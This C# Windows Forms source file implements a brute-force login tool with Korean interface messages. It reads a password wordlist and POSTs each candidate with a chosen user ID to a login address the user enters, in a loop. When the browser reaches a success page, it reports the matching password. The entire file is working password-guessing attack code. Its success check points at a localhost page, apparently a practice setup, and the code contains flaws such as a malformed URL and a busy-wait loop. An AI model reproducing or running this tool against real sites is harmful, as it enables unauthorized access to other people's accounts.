using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Collections;
using System.Threading;

namespace BruteForceLogin
{
    public partial class Form1 : Form
    {
        private ArrayList ArrayPassword = new ArrayList();
        int status = 3;
        Thread FindPasswordThread = null;
        private delegate void FindPASSWORDDelegate(string strText);
        private FindPASSWORDDelegate FindPASSWORD = null;

        public Form1()
        {
            InitializeComponent();
        }

        private void tlsbtnPwd_Click(object sender, EventArgs e)
        {
            if(this.openFileDialog1.ShowDialog()==DialogResult.OK)
            {
                var sr = File.OpenText(this.openFileDialog1.FileName);
                while(true)
                {
                    var pass = sr.ReadLine();
                    if (pass == null)
                        break;
                    ArrayPassword.Add(pass);
                }
                sr.Close();
            }
            MessageBox.Show("비밀번호 리스트가 설정되었습니다.", "알림", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void tlsbtnRun_Click(object sender, EventArgs e)
        {
            if(ArrayPassword.Count>0)
            {
                FindPASSWORD = new FindPASSWORDDelegate(MessageView);
                this.tlstxtAddress.Enabled = false;
                this.tlstxtId.Enabled = false;
                FindPasswordThread = new Thread(ThreadFindPasswd);
                FindPasswordThread.Start();
            }
            else
            {
                MessageBox.Show("비밀번호 리스트를 설정하세요.", "알림", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void MessageView(string strText)
        {
            this.tlstxtAddress.Enabled = true;
            this.tlstxtId.Enabled = true;
            ArrayPassword.Clear();
            MessageBox.Show("비밀번호 : " + strText, "알림", MessageBoxButtons.OK, MessageBoxIcon.Information);
            FindPasswordThread.Abort();
        }

        private void ThreadFindPasswd()
        {
            foreach(var passwd in ArrayPassword)
            {
                byte[] postData = Encoding.Default.GetBytes("userid=" + this.tlstxtId.Text + "&userpw=" + passwd.ToString());
                this.webBrowser1.Navigate(this.tlstxtAddress.Text, null, postData, "Content-Type:application/x-www-form-urlencoded");
                bool isBusy = true;
                status = 3;
                while(isBusy)
                {
                    if (status == 1)
                        isBusy = false;
                    else if(status==2)
                    {
                        Invoke(FindPASSWORD, passwd.ToString());
                        return;
                    }
                }
            }
        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            if (e.Url.ToString() == "http://localhost:8778:/login_ok.asp")
                status = 2;
            else
                status = 1;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (FindPasswordThread != null)
                FindPasswordThread.Abort();
        }
    }
}
